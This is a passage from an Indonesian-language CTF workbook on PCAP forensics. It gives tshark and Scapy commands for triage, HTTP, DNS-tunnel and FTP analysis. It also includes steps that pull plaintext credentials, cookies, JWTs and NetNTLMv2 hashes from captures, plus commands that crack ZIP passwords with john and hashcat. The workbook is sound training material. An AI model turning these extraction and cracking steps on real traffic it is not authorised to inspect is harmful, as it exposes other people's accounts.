if [ "$ICMP_ANOMALY" -gt 0 ]; then
    echo "      [!] PERINGATAN: Ditemukan $ICMP_ANOMALY paket ICMP Echo Request dengan payload besar! (Indikasi ICMP Tunnel)"
fi

# Expert Warnings
echo ""
echo "[+] 7. EXPERT INFO SUMMARY"
tshark -r "$PCAP" -q -z expert | head -n 12

echo ""
echo "=============================================================================="
echo "[*] Triage selesai. Gunakan Wireshark GUI atau script spesifik untuk carving."
echo "=============================================================================="
```

---

## 🛠️ Bagian 12: Troubleshooting & Error Handling

|Kondisi / Pesan Error|Akar Penyebab|Solusi Penanganan|
|---|---|---|
|`tshark: Permission denied on /dev/null`|Konfigurasi permission privilege raw packet capture belum diberikan ke user biasa.|Jalankan: `sudo usermod -aG wireshark $USER` lalu logout dan login kembali ke sistem Parrot OS.|
|`Wireshark: The capture file appears to be damaged or corrupt`|Header global PCAP rusak atau proses transfer file terputus di tengah jalan (_truncated_).|Perbaiki file capture menggunakan pcapfix: `sudo apt install pcapfix && pcapfix target.pcap`.|
|`Export Objects -> HTTP` menghasilkan 0 files|Payload HTTP dikompresi menggunakan Gzip/Brotli atau ditransmisikan via HTTPS tanpa sertifikat.|Buka `Preferences` →→ `Protocols` →→ `HTTP` →→ Centang opsi _Uncompress entity bodies_. Jika HTTPS, sediakan file keylog.|
|Follow TCP Stream hanya menampilkan teks binary acak / simbol|Stream merupakan protokol terenkripsi (TLS/SSH), payload dikompresi zlib, atau transfer biner murni.|Ubah format tampilan di kanan bawah window Follow Stream dari `ASCII` ke `Raw`. Ekspor sebagai binary file lalu cek dengan utility `file`.|
|Field TShark `-e <field>` tidak mencetak output|Nama field salah ketik, atau display filter mendiskualifikasi paket yang memiliki field tersebut.|Validasi nama field resmi melalui dokumentasi: `tshark -G fields \| grep -i "<keyword>"`.|
|Paket mengalami `[Packet size limited during capture]`|Capture dijalankan dengan flag `-s` (snaplen) terbatas, sehingga payload layer atas terpotong permanen.|Payload tidak dapat direkonstruksi utuh. Fokuskan analisis hanya pada layer header (IP, Port, Flags, Metadata).|
|Filter syntax error saat menjalankan query TShark|Terjadi benturan karakter tanda kutip (_quote_) antara bash shell parser dan display filter tshark.|Gunakan tanda petik tunggal `'...'` untuk melingkupi display filter `-Y`, dan tanda petik ganda `"..."` untuk nilai parameter internal.|
|Gagal mendekripsi HTTPS meskipun keylog file sudah disuplai|Keylog file tidak mencakup _Client Random_ dari sesi TLS yang ada di dalam capture tersebut.|Cek kesesuaian Client Random pada Client Hello: `tshark -r target.pcap -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.random`. Cari string ini di file `sslkeylog.txt`.|
|Wireshark GUI freeze / Not Responding pada PCAP berukuran >500MB|Alokasi memori GUI exhaustion akibat proses rendering ribuan frame grafis secara serentak.|Hindari GUI. Gunakan `tshark` CLI dengan flag `-r` dan `-w` untuk memecah capture ke beberapa segmen kecil berdasarkan protokol.|
|`tshark: -T fields requires at least one -e option`|Parameter `-T fields` di-passing tanpa mendefinisikan field target ekstraksi.|Wajib menyertakan minimal satu parameter `-e`, misal: `tshark -r file.pcap -T fields -e ip.src`.|
|Karakter backspace merusak reassembly Telnet|Karakter kontrol interaktif terminal `\x08` dan `\x7f` dirender apa adanya sebagai teks mentah.|Gunakan script reassembly Python `telnet_reassemble.py` pada Bagian 4.5 untuk membersihkan stream buffer.|
|File hasil ekspor SMB / HTTP rusak saat dibuka|File diekspor dalam mode view teks ASCII alih-alih binary raw mode.|Gunakan menu `Export Objects` bawaan atau pastikan stream disimpan dalam format `Raw` di window Follow Stream.|

---

## 📋 Bagian 13: Cheatsheet Copy-Paste Ready

### 1. Initial Triage

Bash

```
# Ringkasan cepat metadata file capture
capinfos target.pcap

# Analisis sebaran seluruh hierarki protokol
tshark -r target.pcap -q -z io,phs

# Pemetaan komunikasi antar IP (Top Talkers)
tshark -r target.pcap -q -z conv,ip

# Pencarian instan pola flag pada frame teks
tshark -r target.pcap -Y 'frame contains "flag{" || frame contains "CTF{"' -T fields -e text

# Evaluasi anomali dan error jaringan
tshark -r target.pcap -q -z expert
```

### 2. HTTP Analysis

Bash

```
# Monitoring alur request URL HTTP
tshark -r target.pcap -Y 'http.request' -T fields -e ip.src -e http.request.method -e http.host -e http.request.uri

# Ekstraksi payload form login (POST data)
tshark -r target.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e http.file_data

# Ekstraksi nilai Cookie
tshark -r target.pcap -Y 'http.cookie' -T fields -e http.cookie | sort -u

# Ekspor otomatis seluruh objek file web HTTP
tshark -r target.pcap --export-objects "http,dump_http" -q

# Dekripsi traffic TLS menggunakan master keylog
tshark -r target.pcap -o "tls.keylog_file:keys.log" -Y 'http' -T fields -e http.request.uri
```

### 3. DNS Analysis

Bash

```
# Listing seluruh query nama domain
tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u

# Filter query anomali berukuran panjang (>50 chars - Indikasi Exfiltration)
tshark -r target.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | awk 'length($1) > 50' | sort -u

# Monitoring query record tipe TXT
tshark -r target.pcap -Y 'dns.qry.type == 16' -T fields -e dns.qry.name -e dns.txt

# Ekstraksi IP resolver yang digunakan
tshark -r target.pcap -Y 'dns' -T fields -e ip.dst | sort | uniq -c | sort -rn
```

### 4. FTP & Telnet Analysis

Bash

```
# Ekstraksi kredensial login plaintext FTP
tshark -r target.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields -e ftp.request.command -e ftp.request.arg

# Ekstraksi daftar nama file yang ditransfer pada FTP
tshark -r target.pcap -Y 'ftp.request.command == "RETR" || ftp.request.command == "STOR"' -T fields -e ftp.request.arg

# Ekstraksi perintah interaktif terminal Telnet
tshark -r target.pcap -Y 'telnet' -T fields -e telnet.data

# Rekonstruksi aliran binary stream FTP data (misal stream 2)
tshark -r target.pcap -q -z "follow,tcp,raw,2" | tail -n +7 | head -n -1 | xxd -r -p > ftp_recovered.bin
```

### 5. Credential & Hash Extraction

Bash

```
# Ekstraksi dan decode HTTP Basic Auth
tshark -r target.pcap -Y 'http.authorization contains "Basic"' -T fields -e http.authorization | awk '{print $2}' | sort -u | base64 -d

# Ekstraksi token JWT
tshark -r target.pcap -Y 'http contains "eyJ"' -T fields -e http.file_data | grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" | sort -u

# Isolasi pesan autentikasi NetNTLMv2
tshark -r target.pcap -Y 'ntlmssp.messagetype == 3' -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmresponse
```

### 6. File Carving & Stream Dumping

Bash

```
# Carving file otomatis dari protokol SMB/SMB2
tshark -r target.pcap --export-objects "smb,dump_smb" -q

# Carving data stream TCP menggunakan tcpflow
tcpflow -r target.pcap -o output_dir/

# Ekstraksi payload ICMP langsung ke format binary
tshark -r target.pcap -Y 'icmp.type == 8 && data.len > 0' -T fields -e data.data | tr -d '\n' | xxd -r -p > icmp_payload.bin
```

### 7. Scapy Quick Execution

Bash

```bash
# 1. One-liner ekstraksi seluruh DNS Query menggunakan Python Scapy
python3 -c 'from scapy.all import *; [print(p[DNSQR].qname.decode()) for p in rdpcap("target.pcap") if p.haslayer(DNSQR)]'

# 2. One-liner pencarian raw string flag di seluruh paket TCP
python3 -c '
from scapy.all import *
pkts = rdpcap("target.pcap")
for i, p in enumerate(pkts):
    if p.haslayer(Raw):
        data = p[Raw].load
        if b"flag" in data.lower() or b"CTF{" in data or b"HTB{" in data:
            print(f"[Packet {i}]: {data}")
'

# 3. Ekstraksi nomor sequence TCP untuk covert channel decoding
python3 -c '
from scapy.all import *
pkts = rdpcap("target.pcap")
chars = [chr(p[TCP].seq % 128) 
         for p in pkts 
         if p.haslayer(TCP) and p[TCP].flags == "S"
         and 32 <= p[TCP].seq % 128 <= 126]
print("".join(chars))
'
```

---

## 🔗 Relasi Modul & Langkah Berikutnya

```text
[ FILE 56: STEGANOGRAPHY WORKFLOW ]
(Gambar/audio hasil ekspor HTTP/FTP -> analisis stego)
                   │
                   ▼
[ FILE 57: PCAP ANALYSIS WORKFLOW ] <--- (ANDA BERADA DI SINI)
(Menganalisis lalu lintas jaringan, kredensial, & eksfiltrasi)
                   │
                   ▼
[ FILE 58: MEMORY FORENSICS WORKFLOW ]
(Menganalisis memory dump RAM .raw/.mem/.dmp sistem OS)
```

- **Kapan Selesai di File 57:**  
  Jika flag ditemukan di payload HTTP, kredensial FTP, sesi Telnet, ICMP tunnel, atau DNS exfiltration.
- **Kapan Harus Melanjutkan ke File 58 (Memory Forensics):**  
  Jika challenge memberikan file dump RAM (`.raw`, `.mem`, `.dmp`, `.vmem`) dari sistem Windows atau Linux.

---

# [🏛️ Bagian 0: Fondasi PCAP Analysis](/docs/pcap-analysis) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali disebutkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export PCAP="challenge.pcap"           # Ganti dengan nama file PCAP kamu
mkdir -p ~/pcap_loot/{files,creds,extracted,scripts}
cd ~/pcap_loot

echo "[*] Analyzing: $PCAP"
echo "[*] Working dir: ~/pcap_loot"

# Verifikasi tools tersedia
for tool in tshark wireshark capinfos tcpflow zeek python3; do
    which $tool &>/dev/null && echo "[+] $tool: OK" || echo "[-] $tool: MISSING"
done
```

**Output yang diharapkan:**

text

```
[*] Analyzing: challenge.pcap
[*] Working dir: ~/pcap_loot
[+] tshark: OK
[+] wireshark: OK
[+] capinfos: OK
[+] tcpflow: OK
[+] zeek: OK
[+] python3: OK
```

**OUTPUT GAGAL ❌ — Tool missing:**

text

```
[-] tshark: MISSING
```

➡️ Install dulu:

Bash

```
sudo apt update && sudo apt install -y wireshark tshark tcpdump tcpflow zeek python3-scapy
sudo usermod -aG wireshark $USER
# Logout + login ulang agar group aktif
```

---

## ═══════════════════════════════════════

## FASE 0: TRIAGE AWAL — KENALI FILE PCAP

## ═══════════════════════════════════════

> **Tujuan:** Sebelum buka Wireshark, petakan dulu isi PCAP dalam 2 menit. Ini menentukan SEMUA langkah berikutnya.

### Langkah 0.1 — Metadata & Integritas File

Bash

```
# Command 1: Metadata lengkap
capinfos $PCAP

# Command 2: Cek apakah file corrupt
file $PCAP
```

**OUTPUT BERHASIL ✅ — File normal:**

text

```
File name:            challenge.pcap
File type:            Wireshark/tcpdump/... - pcap
File encapsulation:   Ethernet
Number of packets:    14,290
File size:            8,412,980 bytes
Capture duration:     234.120938 seconds
Start time:           Wed Oct 18 10:14:02 2023
End time:             Wed Oct 18 10:17:56 2023
Average packet size:  572.71 bytes
SHA256:               e3b0c44298fc1c149afb...
```

**Cara baca metadata — PENTING:**

|Field|Nilai Normal|Nilai Mencurigakan|
|---|---|---|
|`Capture duration`|>30 detik untuk incident|<5 detik tapi ribuan paket = Port Scan|
|`Number of packets`|Bervariasi|>50k dalam <5 detik = flooding|
|`Average packet size`|400-1500 bytes|<100 bytes = scan/tunnel/covert|
|`Packet size limit`|65535 (default)|68 atau 96 = payload terpotong!|

**OUTPUT GAGAL ❌ — File corrupt:**

text

```
capinfos: The file "challenge.pcap" appears to be damaged or corrupt
```

➡️ Perbaiki dulu:

Bash

```
# Install pcapfix
sudo apt install -y pcapfix

# Perbaiki file
pcapfix $PCAP -o fixed.pcap

# Lanjutkan dengan file yang sudah diperbaiki
export PCAP="fixed.pcap"
capinfos $PCAP
```

**OUTPUT GAGAL ❌ — Bukan format PCAP:**

text

```
challenge.pcap: data
```

➡️ Cek format sebenarnya:

Bash

```
xxd $PCAP | head -5
# Magic bytes PCAP: d4 c3 b2 a1 (little-endian) atau a1 b2 c3 d4 (big-endian)
# Magic bytes PCAPNG: 0a 0d 0d 0a
# Jika bukan keduanya → file mungkin di-encode atau di-compress
file $PCAP
strings $PCAP | head -20
```

---

### Langkah 0.2 — Protocol Hierarchy (PALING KRITIS)

Bash

```
# Command utama: Distribusi protokol
tshark -r $PCAP -q -z io,phs
```

**OUTPUT BERHASIL ✅ — Contoh output lengkap:**

text

```
===================================================================
Protocol Hierarchy Statistics
Filter: 
eth                                      frames:14290 bytes:8412980
  ip                                     frames:14290 bytes:8412980
    tcp                                  frames:12100 bytes:7840120
      http                               frames:240   bytes:412030
        data-text-lines                  frames:40    bytes:8120
        image-png                        frames:12    bytes:350110
      tls                                frames:9800  bytes:6910240
      ftp                                frames:45    bytes:12300
      ftp-data                           frames:120   bytes:890000
    udp                                  frames:1890  bytes:452860
      dns                                frames:1850  bytes:442120
    icmp                                 frames:300   bytes:120000
      data                               frames:300   bytes:120000
===================================================================
```

**Decision Matrix — Tentukan Jalur Analisis:**

|Protokol Dominan|Indikasi|Langsung ke Fase|
|---|---|---|
|`http` besar|Web traffic, credentials, file transfer|**Fase 2**|
|`dns` > 500 query|Kemungkinan DNS tunneling/exfiltration|**Fase 3**|
|`ftp` + `ftp-data`|File transfer, plaintext creds|**Fase 4**|
|`smb2` / `smb`|Windows file sharing, NTLM hashes|**Fase 5**|
|`telnet`|Interactive terminal plaintext|**Fase 6**|
|`icmp` dengan `data` sublayer|ICMP covert channel|**Fase 7**|
|`tls` dominan|HTTPS encrypted — cek ada keylog file tidak|**Fase 8**|
|Port non-standar (4444, 1337, 31337)|Reverse shell / C2|**Fase 9**|
|`smtp` / `pop` / `imap`|Email credentials + attachments|**Fase 10**|

➡️ **Catat semua protokol yang muncul** — jangan hanya fokus ke satu. PCAP CTF sering punya multiple layers.

---

### Langkah 0.3 — Quick Flag Hunt (Sebelum Analisis Mendalam)

Bash

```
# Command 1: Cari flag langsung di semua paket
tshark -r $PCAP \
    -Y 'frame contains "flag{" || frame contains "FLAG{" || frame contains "picoCTF{" || frame contains "HTB{" || frame contains "THM{"' \
    -T fields -e frame.number -e ip.src -e ip.dst -e text 2>/dev/null

# Command 2: Regex search lebih fleksibel
tshark -r $PCAP \
    -Y 'frame matches "(?i)(flag|ctf|htb|thm)\{[a-zA-Z0-9_!@#$%^&*-]+\}"' \
    -T fields -e frame.number -e text 2>/dev/null

# Command 3: strings mentah (bypass parsing)
strings $PCAP | grep -iE "(flag|ctf|htb|thm)\{[a-zA-Z0-9_!@#$%^&*-]+\}"
```

**OUTPUT BERHASIL ✅ — FLAG LANGSUNG DITEMUKAN:**

text

```
142    192.168.1.105    192.168.1.200    GET /secret?token=flag{quick_win_from_triage}
```

➡️ **SELESAI!** Submit flag. Jika ingin verifikasi, cek frame 142 di Wireshark.

**OUTPUT GAGAL ❌ — Tidak ada output / flag tidak ketemu:**

text

```
(kosong)
```

➡️ Flag tidak dalam plaintext langsung. Lanjut ke **Langkah 0.4** untuk Top Talkers, kemudian masuk ke Fase spesifik berdasarkan protokol.

---

### Langkah 0.4 — Top Talkers & Anomali Cepat

Bash

```
# Command 1: IP conversations (siapa ngobrol sama siapa)
tshark -r $PCAP -q -z conv,ip | head -20

# Command 2: Port conversations (port apa yang aktif)
tshark -r $PCAP -q -z conv,tcp | head -20

# Command 3: Expert info (ada error/anomali apa)
tshark -r $PCAP -q -z expert | head -20

# Command 4: Hitung paket per IP (temukan attacker/victim)
tshark -r $PCAP -T fields -e ip.src | sort | uniq -c | sort -rn | head -10
```

**OUTPUT BERHASIL ✅ — Conversations:**

text

```
================================================================================
IPv4 Conversations
                                   Frames   Bytes  |  Frames   Bytes  |  Total
192.168.1.105  <-> 10.0.0.53        925   221060     925   221060    1850  442120
192.168.1.105  <-> 185.199.108.153 4800  3400120    5000  3510120    9800  6910240
================================================================================
```

**Cara baca:**

- `192.168.1.105` ↔ `10.0.0.53` dengan 1850 frame DNS = **DNS Tunneling suspect**
- `192.168.1.105` ↔ `185.199.108.153` dengan volume besar = **exfiltration suspect**

**OUTPUT BERHASIL ✅ — Expert info mencurigakan:**

text

```
Warn    Warning    Connection reset (RST)                    342
Error   Error      Malformed Packet (Exception occurred)     2
```

**Interpretasi Expert Info:**

|Warning|Arti|
|---|---|
|Banyak RST|Port scanning aktif|
|Malformed Packet|Buffer overflow exploit attempt atau custom protocol|
|TCP Out-of-Order|Bisa normal, atau packet injection|
|TCP Retransmission banyak|Network stress atau intentional manipulation|

➡️ Setelah identifikasi protokol target, lanjut ke Fase yang sesuai.

---

## ═══════════════════════════════════════

## FASE 1: SETUP VARIABEL & IDENTIFIKASI HOST

## ═══════════════════════════════════════

Bash

```
# Identifikasi semua IP unik dalam capture
tshark -r $PCAP -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u | grep -v "^$"
```

**OUTPUT BERHASIL ✅:**

text

```
10.0.0.53
10.10.14.5
192.168.1.1
192.168.1.105
185.199.108.153
```

Bash

```
# Set variabel untuk convenience
export VICTIM_IP="192.168.1.105"      # IP yang paling banyak kirim/terima
export ATTACKER_IP="185.199.108.153"  # IP eksternal mencurigakan
export DNS_SERVER="10.0.0.53"

echo "[*] Victim: $VICTIM_IP | Attacker: $ATTACKER_IP"
```

---

## ═══════════════════════════════════════

## FASE 2: HTTP ANALYSIS

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `http` dengan banyak frames

### Langkah 2.1 — Peta Traffic HTTP

Bash

```
# Command 1: Semua HTTP request (URL mapping)
tshark -r $PCAP -Y 'http.request' \
    -T fields -e frame.number -e ip.src -e http.request.method -e http.host -e http.request.uri \
    | tee ~/pcap_loot/http_requests.txt

# Command 2: HTTP responses (cari 200 OK yang menarik)
tshark -r $PCAP -Y 'http.response' \
    -T fields -e frame.number -e ip.src -e http.response.code -e http.content_type \
    | tee ~/pcap_loot/http_responses.txt

# Command 3: User-Agent (identifikasi tools yang dipakai)
tshark -r $PCAP -Y 'http.user_agent' -T fields -e http.user_agent | sort -u
```

**OUTPUT BERHASIL ✅ — HTTP requests terdeteksi:**

text

```
142    192.168.1.105    GET     example.com    /login.php
143    192.168.1.105    POST    example.com    /login.php
156    192.168.1.105    GET     example.com    /admin/dashboard
```

**Interpretasi User-Agent:**

|User-Agent|Artinya|
|---|---|
|`python-requests/2.x`|Script Python — bisa automated attack|
|`curl/7.x`|Command line tool — bisa manual attack|
|`sqlmap/1.x`|SQL injection tool!|
|`Nikto`|Web scanner|
|Normal browser|User biasa atau simulated traffic|

---

### Langkah 2.2 — HTTP Credential Hunting

Bash

```
# Command 1: HTTP POST data (login forms)
tshark -r $PCAP -Y 'http.request.method == "POST"' \
    -T fields -e frame.number -e ip.src -e http.request.uri -e http.file_data \
    | grep -iE "(user|pass|login|pwd|token|key|secret|email)"

# Command 2: HTTP Basic Auth (auto-decode)
tshark -r $PCAP -Y 'http.authorization contains "Basic"' \
    -T fields -e ip.src -e http.authorization \
    | sort -u | while read -r line; do
        b64=$(echo "$line" | awk '{print $NF}')
        decoded=$(echo "$b64" | base64 -d 2>/dev/null)
        echo "[HTTP BASIC] $line -> DECODED: $decoded"
    done

# Command 3: Bearer tokens & API keys
tshark -r $PCAP -Y 'http.authorization contains "Bearer"' \
    -T fields -e ip.src -e http.authorization | sort -u

# Command 4: Cookies (session hijacking material)
tshark -r $PCAP -Y 'http.cookie' \
    -T fields -e ip.src -e http.host -e http.cookie | sort -u | tee ~/pcap_loot/creds/cookies.txt
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan:**

text

```
192.168.1.105    /login.php    username=admin&password=SuperSecret123!
[HTTP BASIC] 192.168.1.105 Basic YWRtaW46cGFzc3dvcmQ= -> DECODED: admin:password
```

➡️ **SIMPAN:**

Bash

```
echo "admin:SuperSecret123!" >> ~/pcap_loot/creds/found_creds.txt
echo "admin:password" >> ~/pcap_loot/creds/found_creds.txt
```

**OUTPUT BERHASIL ✅ — JWT token ditemukan:**

text

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

➡️ Decode JWT:

Bash

```
# Decode header dan payload (tanpa verify signature)
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx"
echo $JWT | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Coba crack JWT secret
# → Lanjut ke <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a>
```

**OUTPUT GAGAL ❌ — Tidak ada HTTP credentials:**

text

```
(kosong)
```

➡️ Form mungkin pakai HTTPS. Cek Fase 8 untuk TLS decryption. Atau lanjut cek Fase lain.

---

### Langkah 2.3 — HTTP File Export

Bash

```
# Method 1: Export semua HTTP objects (recommended)
mkdir -p ~/pcap_loot/extracted/http
tshark -r $PCAP --export-objects "http,~/pcap_loot/extracted/http" -q

# Cek apa yang didapat
ls -la ~/pcap_loot/extracted/http/
for f in ~/pcap_loot/extracted/http/*; do
    echo "$(stat -c%s "$f" 2>/dev/null) bytes | $(file "$f" | cut -d: -f2) | $f"
done | sort -rn

# Method 2: Wireshark GUI
# File → Export Objects → HTTP → Export All
```

**OUTPUT BERHASIL ✅ — File terextract:**

text

```
892345 bytes | Zip archive data | ~/pcap_loot/extracted/http/%2Fdownload%2Fbackup.zip
45231  bytes | Microsoft OOXML | ~/pcap_loot/extracted/http/%2Ffiles%2Fdata.xlsx
1203   bytes | ASCII text      | ~/pcap_loot/extracted/http/%2Fconfig.txt
```

➡️ Analisis file yang ditemukan:

Bash

```
# Cari password/flag di file teks
grep -ri "flag\|password\|secret\|key" ~/pcap_loot/extracted/http/ 2>/dev/null

# Unzip arsip
cd ~/pcap_loot/extracted/http/
unzip -o "backup.zip" -d backup_extracted/ 2>/dev/null

# Cek file images untuk steganografi
for img in *.png *.jpg *.jpeg *.bmp *.gif 2>/dev/null; do
    [ -f "$img" ] && echo "Image found: $img" && file "$img"
done
# → Jika ada image, lanjut ke <a href="/docs/steganography" class="text-[#00b4d8] hover:underline font-mono font-semibold">56_steganography_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — ZIP dengan password:**

text

```
unzip: need PK compat. v5.1 (can do v4.6): backup.zip
   skipping: secret.txt              need PK compat...
```

➡️ Crack ZIP password:

Bash

```
# Method 1: zip2john + john
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Method 2: hashcat
hashcat -m 17200 zip.hash /usr/share/wordlists/rockyou.txt
```

**OUTPUT GAGAL ❌ — Export objects 0 files:**

text

```
(folder kosong)
```

➡️ Kemungkinan:

1. Traffic dikompresi — cek `Wireshark > Preferences > Protocols > HTTP > Uncompress entity bodies`
2. Traffic adalah HTTPS — lanjut ke **Fase 8**
3. Koneksi tidak complete — file tidak bisa di-reconstruct

---

### Langkah 2.4 — HTTP Stream Analysis (Manual)

Bash

```
# Lihat semua TCP stream numbers yang ada
tshark -r $PCAP -Y 'http' -T fields -e tcp.stream | sort -nu

# Follow stream specific (misal stream 0)
tshark -r $PCAP -q -z "follow,tcp,ascii,0" | head -100
```

**OUTPUT BERHASIL ✅ — Stream content terlihat:**

text

```
===================================================================
Follow: tcp, Stream: 0
===================================================================
GET /secret.txt HTTP/1.1
Host: 192.168.1.200
User-Agent: curl/7.64.0

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 42

flag{found_in_http_stream_analysis_2024}
```

➡️ **FLAG DITEMUKAN!**

---

## ═══════════════════════════════════════

## FASE 3: DNS ANALYSIS & DNS TUNNELING

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `dns` dengan jumlah frame tidak wajar (>300 ke satu domain)

### Langkah 3.1 — Peta DNS Traffic

Bash

```
# Command 1: Semua DNS queries unik
tshark -r $PCAP -Y 'dns.flags.response == 0' \
    -T fields -e dns.qry.name -e dns.qry.type | sort -u | tee ~/pcap_loot/dns_queries.txt

# Command 2: Hitung query per domain (top talkers DNS)
tshark -r $PCAP -Y 'dns.flags.response == 0' -T fields -e dns.qry.name \
    | awk -F'.' 'NF>=2{print $(NF-1)"."$NF}' \
    | sort | uniq -c | sort -rn | head -20

# Command 3: DNS query types breakdown
tshark -r $PCAP -Y 'dns.flags.response == 0' -T fields -e dns.qry.type \
    | sort | uniq -c | sort -rn
```

**OUTPUT BERHASIL ✅ — Normal DNS traffic:**

text

```
   3    google.com
   2    github.com
   1    cloudflare.com
```

➡️ DNS traffic normal. Skip ke Fase lain.

**OUTPUT MENCURIGAKAN ⚠️ — DNS Tunneling indicators:**

text

```
 925    c2.evilcorp.com         ← 925 queries ke satu domain = TUNNELING!
   3    google.com
```

➡️ Lanjut ke **Langkah 3.2**.

---

### Langkah 3.2 — Deteksi & Ekstraksi DNS Tunneling

Bash

```
# Command 1: Cari query dengan nama sangat panjang (>50 chars)
tshark -r $PCAP -Y 'dns.flags.response == 0' -T fields -e dns.qry.name \
    | awk 'length($1) > 50' | sort -u | tee ~/pcap_loot/long_dns_queries.txt

# Command 2: Cek DNS TXT records (sering dipakai C2 response)
tshark -r $PCAP -Y 'dns.qry.type == 16' \
    -T fields -e dns.qry.name -e dns.txt | sort -u

# Command 3: Lihat contoh subdomain yang mencurigakan
head -10 ~/pcap_loot/long_dns_queries.txt
```

**OUTPUT BERHASIL ✅ — DNS Tunneling dikonfirmasi:**

text

```
aW5mb3NlY3JldA==.c2.evilcorp.com
ZXhmaWx0cmF0aW9u.c2.evilcorp.com
dGhpcyBpcyBzZWNyZXQ=.c2.evilcorp.com
```

➡️ Subdomain ini adalah data yang di-encode Base64! Decode:

Bash

```
# Manual decode satu query
echo "aW5mb3NlY3JldA==" | base64 -d
# Output: infosecret

# Ekstrak semua subdomain dan decode otomatis
TARGET_DOMAIN="c2.evilcorp.com"   # Ganti sesuai domain yang ditemukan

tshark -r $PCAP -Y 'dns.flags.response == 0' -T fields -e dns.qry.name \
    | grep "$TARGET_DOMAIN" \
    | sed "s/\.$TARGET_DOMAIN//" \
    | tr -d '.' \
    | sort -u \
    | while read -r chunk; do
        decoded=$(echo "$chunk" | base64 -d 2>/dev/null)
        [ -n "$decoded" ] && echo "$decoded"
    done | tee ~/pcap_loot/dns_decoded.txt
```

**OUTPUT BERHASIL ✅ — Decoded content:**

text

```
infosecret
this is the flag:
flag{dns_tunnel_exfil_data_recovered}
config_data=admin:pass123
```

**OUTPUT GAGAL ❌ — Base64 decode gagal (garbled output):**

text

```
▒▒▒⟩Œ±±±...
```

➡️ Encoding bukan Base64 standar. Coba alternatif:

Bash

```
# Coba Hex
echo "6869" | xxd -r -p

# Coba Base32
echo "JBSWY3DPEB3W64TMMQ======" | base32 -d

# Gunakan script otomatis yang lebih comprehensive
python3 << 'EOF'
import base64, binascii
from scapy.all import rdpcap, DNSQR

TARGET = "c2.evilcorp.com"
packets = rdpcap("challenge.pcap")

chunks = []
seen = set()
for pkt in packets:
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
        if TARGET in qname and qname not in seen:
            seen.add(qname)
            sub = qname.replace(f".{TARGET}", "").replace(".", "")
            chunks.append(sub)

full = "".join(chunks)
print(f"[*] Raw combined: {full[:100]}...")

# Try Base64
try:
    pad = full + "=" * (4 - len(full) % 4)
    print(f"[+] Base64: {base64.b64decode(pad)[:200]}")
except: pass

# Try Hex
try:
    print(f"[+] Hex: {bytes.fromhex(full)[:200]}")
except: pass

# Try Base32
try:
    print(f"[+] Base32: {base64.b32decode(full.upper())[:200]}")
except: pass
EOF
```

---

## ═══════════════════════════════════════

## FASE 4: FTP ANALYSIS

## ═══════════════════════════════════════

> **Masuk sini jika:** Protocol hierarchy menunjukkan `ftp` dan/atau `ftp-data`

### Langkah 4.1 — FTP Credential Extraction

Bash

```
# Command 1: Username dan password FTP (plaintext!)
tshark -r $PCAP \
    -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
    -T fields -e frame.number -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg

# Command 2: Semua FTP commands (lihat aktivitas lengkap)
tshark -r $PCAP -Y 'ftp.request' \
    -T fields -e frame.number -e ftp.request.command -e ftp.request.arg

# Command 3: Server responses (lihat apakah login berhasil)
tshark -r $PCAP -Y 'ftp.response' \
    -T fields -e frame.number -e ftp.response.code -e ftp.response.arg | head -20
```

**OUTPUT BERHASIL ✅ — FTP credentials ditemukan:**

text

```
42    192.168.1.105    10.0.0.21    USER    ftpuser
43    192.168.1.105    10.0.0.21    PASS    FTPpassword123!
```

**FTP Response codes yang penting:**

|Code|Arti|
|---|---|
|`220`|Service ready (server banner)|
|`230`|Login successful|
|`331`|Username OK, need password|
|`530`|Login failed|
|`226`|Transfer complete|
|`550`|Access denied|

Bash

```
# Simpan credentials
echo "ftpuser:FTPpassword123!" >> ~/pcap_loot/creds/found_creds.txt

# Lihat file apa yang ditransfer
tshark -r $PCAP \
    -Y 'ftp.request.command == "RETR" || ftp.request.command == "STOR"' \
    -T fields -e ftp.request.command -e ftp.request.arg
```

---

### Langkah 4.2 — FTP File Recovery

Bash

```
# Method 1: Export via tshark (paling mudah)
mkdir -p ~/pcap_loot/extracted/ftp
tshark -r $PCAP --export-objects "ftp-data,~/pcap_loot/extracted/ftp" -q

ls -la ~/pcap_loot/extracted/ftp/
```

**OUTPUT BERHASIL ✅ — File terextract:**

text

```
-rw-r--r-- 1 user user 892345 Oct 18 10:15 secret_document.pdf
-rw-r--r-- 1 user user  12034 Oct 18 10:16 backup.tar.gz
```

**OUTPUT GAGAL ❌ — Folder kosong:**

text

```
